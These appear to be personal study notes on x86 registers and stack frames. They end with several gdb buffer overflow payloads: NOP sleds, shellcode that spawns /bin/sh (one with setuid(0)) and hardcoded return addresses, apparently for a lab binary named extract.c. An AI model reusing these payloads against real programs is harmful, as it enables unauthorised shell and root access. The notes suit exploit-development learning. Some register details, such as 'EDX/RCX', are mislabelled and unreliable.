Quickly accessible locations available to a cpu, consist of a small amount of fast storage.

[article](https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html)

# notation

- if preceded with e (stands for extended), it's a 32 bit register
- if preceded with r (idk what is stands for) it's a 64 bit register

# General registers

- AX register (eax in 32 rax in 64 bits) : Accumulator, used for i/o and arithmetic ops
- EBX/RBX : optionally used a base pointer
- ECX/RCX : counter register, used for loop counters and for shifts (whatever it means)
- EDX/RCX : Data register, I/O and in arithmetic operations for multiply and divide operations involving large values

# Pointer registers

- EIP/RIP : instruction pointer, offset address of the next instruction
- ESP/RSP : Points to the top of the stack
- EBP/RBP : Stack base pointer aka frame pointer.
  - s stack frame : EBP points to its base (its beginning in the high memory address), and ESP points to its top,

## Assembly function prologue

- push the current value of ebp into the stack (it contains the base pointer of the previous stack frame)
- mov the value of esp into ebp, thus creating a new stack frame.

```s
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 # <---- 3. Moves ESP to the top, by subbing the number of bytes required for local vars
```

- for getting out of a stack frame, esp is replaced with the current ebp, and ebp is popped off the stack  
  [stack overflow answer](https://stackoverflow.com/a/3700219/14500132)

- anatomy of a stack frame
  - ESP | Buffer space (where local vars are stored) | EBP | EIP
- esp at the top, and eip at the bottom of the stack

```
  run $(python -c 'print ((520-95)*"\x90" + "\xda\xc2\xb8\xee\x8a\x6d\x66\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x12\x31\x42\x17\x83\xc2\x04\x03\xac\x99\x8f\x93\x01\x45\xb8\xbf\x32\x3a\x14\x2a\xb6\x35\x7b\x1a\xd0\x88\xfc\xc8\x45\xa3\xc2\x23\xf5\x8a\x45\x45\x9d\x73\xb6\xb5\x5c\xe4\xb4\xb5\x24\x9d\x31\x54\x68\x3b\x12\xc6\xdb\x77\x91\x61\x3a\xba\x16\x23\xd4\x2b\x38\xb7\x4c\xdc\x69\x18\xee\x75\xff\x85\xbc\xd6\x76\xa8\xf0\xd2\x45\xab"+"\xd6\xd8\xff\xff" ) ' )


  run $(python -c 'print ((520-95)*"\x90" + "\xdb\xc8\xbe\xd6\x75\x07\xe6\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x12\x31\x70\x17\x83\xc0\x04\x03\xa6\x66\xe5\x13\x77\x52\x1e\x38\x24\x27\xb2\xd5\xc8\x2e\xd5\x9a\xaa\xfd\x96\x48\x6b\x4e\xa9\xa3\x0b\xe7\xaf\xc2\x63\x87\x4f\x35\x72\x1f\x52\x35\x0e\xb6\xdb\xd4\x5e\x2e\x8c\x47\xcd\x1c\x2f\xe1\x10\xaf\xb0\xa3\xba\x5e\x9e\x30\x52\xf7\xcf\x99\xc0\x6e\x99\x05\x56\x22\x10\x28\xe6\xcf\xef\x2b"+"\x04\xd7\xff\xff" ) ' )


  run $(python -c 'print ((520-25)*"\x90" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +"\xe4\xd6\xff\xff" ) ' )

Payload for extract.c

 run $(python -c 'print ((524-25)*"\x90" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +"\x50\xd7\xff\xff" )')


\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

 run $(python -c 'print ((524-53)*"\x90" + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" +"\x50\xd7\xff\xff" )')

```
